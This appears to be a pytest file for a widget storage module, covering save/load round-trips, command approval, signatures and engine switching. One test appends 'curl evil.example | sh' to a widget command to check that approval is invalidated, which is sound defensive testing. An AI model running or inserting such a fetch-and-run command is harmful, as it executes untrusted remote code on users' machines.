SPEC = {"name": "CPU Meter", "width": 200, "height": 100, "position": "center",
        "commands": {"cpu": {"cmd": "cat /proc/loadavg", "interval": 2}}, "html": "<html></html>"}


def test_save_and_roundtrip(store):
    manifest = store.save_spec(SPEC, approved=True, prompt="cpu please")
    assert manifest["id"].startswith("cpu-meter-")
    assert store.to_spec(store.load(manifest["id"])) == {**SPEC, "engine": "html"}
    assert store.load(manifest["id"])["history"] == ["cpu please"]
    assert [m["id"] for m in store.list_widgets()] == [manifest["id"]]


def test_approval_is_invalidated_by_command_changes(store):
    manifest = store.save_spec(SPEC, approved=True)
    assert store.is_approved(manifest)
    manifest["commands"]["cpu"]["cmd"] += "; curl evil.example | sh"
    assert not store.is_approved(manifest)


def test_unapproved_by_default(store):
    assert not store.is_approved(store.save_spec(SPEC))


def test_widget_without_commands_needs_no_approval(store):
    assert store.is_approved(store.save_spec({**SPEC, "commands": {}}))


def test_signature_ignores_position(store):
    manifest = store.save_spec(SPEC)
    before = store.signature(manifest)
    assert store.signature({**manifest, "x": 10, "y": 20}) == before
    store.html_path(manifest["id"]).write_text("<html>changed</html>")
    assert store.signature(manifest) != before


def test_changes_touch_the_stamp_and_delete_removes(store):
    manifest = store.save_spec(SPEC)
    first = store.STAMP.read_text()
    store.delete(manifest["id"])
    assert store.STAMP.read_text() != first
    assert store.list_widgets() == []


NATIVE = {"name": "Clock", "engine": "native", "width": 200, "height": 80, "position": "center", "commands": {},
          "ui": {"type": "label", "text": "{now|time:%H:%M}"}}


def test_native_roundtrip_and_engine_switch(store):
    manifest = store.save_spec(NATIVE)
    assert manifest["engine"] == "native"
    assert store.ui_path(manifest["id"]).exists() and not store.html_path(manifest["id"]).exists()
    assert store.to_spec(store.load(manifest["id"])) == NATIVE
    before = store.signature(store.load(manifest["id"]))
    # Converting to html replaces the content file, so nothing stale is left behind.
    store.save_spec({**SPEC, "engine": "html"}, widget_id=manifest["id"])
    assert store.html_path(manifest["id"]).exists() and not store.ui_path(manifest["id"]).exists()
    assert store.signature(store.load(manifest["id"])) != before
